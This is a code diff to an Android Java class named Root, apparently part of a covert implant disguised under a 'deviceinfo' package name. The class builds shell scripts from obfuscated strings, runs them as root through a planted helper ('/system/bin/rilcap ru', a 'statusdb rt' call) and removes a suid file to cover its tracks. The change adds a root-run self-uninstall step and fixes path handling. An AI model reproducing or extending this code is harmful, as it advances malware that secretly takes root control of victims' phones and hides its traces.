@@ -32,6 +32,8 @@ import com.android.deviceinfo.crypto.Keys;
 import com.android.deviceinfo.util.ByteArray;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.Execute;
+import com.android.deviceinfo.util.ExecuteResult;
+import com.android.deviceinfo.util.StringUtils;
 import com.android.deviceinfo.util.Utils;
 
 public class Root {
@@ -104,8 +106,8 @@ public class Root {
 
 		String packageName = Status.self().getAppContext().getPackageName();
 		String script = Messages.getString("32_34") + "\n";
-
-		script += "pm uninstall " + packageName + "\n";
+		script += "/system/bin/rilcap ru\n";
+		script += "LD_LIBRARY_PATH=/vendor/lib:/system/lib pm uninstall " + packageName +"\n";
 
 		String filename = "c";
 		if (createScript(filename, script) == false) {
@@ -117,7 +119,10 @@ public class Root {
 		}
 
 		Execute ex = new Execute();
-		ex.executeRoot(Status.getAppContext().getFilesDir() + "/" + filename);
+		ExecuteResult result = ex.executeRoot(Status.getAppContext().getFilesDir() + "/" + filename);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (uninstallRoot) result stdout: %s stderr: %s", StringUtils.join(result.stdout), StringUtils.join(result.stderr));
+		}
 
 		removeScript(filename);
 
@@ -159,9 +164,6 @@ public class Root {
 			// 32.29 = /data/data/com.android.service/files/statusdb rt
 			// 32_34=#!/system/bin/sh\n
 			String script = Messages.getString("32_34") + "\n" + Messages.getString("32_29") + "\n";
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (superapkRoot), script: " + script);
-			}
 
 			if (Root.createScript("s", script) == true) {
 				// 32_7=/system/bin/chmod 755
@@ -185,7 +187,7 @@ public class Root {
 					Check.log(TAG + " ERROR: (superapkRoot), cannot create script");
 				}
 			}
-			
+
 			File file = new File(Status.getAppContext().getFilesDir(), suidext);
 			file.delete();
 		} catch (final Exception e1) {
@@ -215,7 +217,7 @@ public class Root {
 			fos.close();
 
 			Execute ex = new Execute();
-			ex.execute("chmod 755 " + Status.getAppContext().getFilesDir() + name);
+			ex.execute("chmod 755 " + Status.getAppContext().getFilesDir() + "/" + name);
 
 			return true;
 		} catch (Exception e) {
@@ -238,7 +240,7 @@ public class Root {
 			fos.close();
 
 			Execute ex = new Execute();
-			ex.execute("chmod 755 " + Status.getAppContext().getFilesDir() + name);
+			ex.execute("chmod 755 " + Status.getAppContext().getFilesDir() + "/" + name);
 
 			return true;
 		} catch (Exception e) {
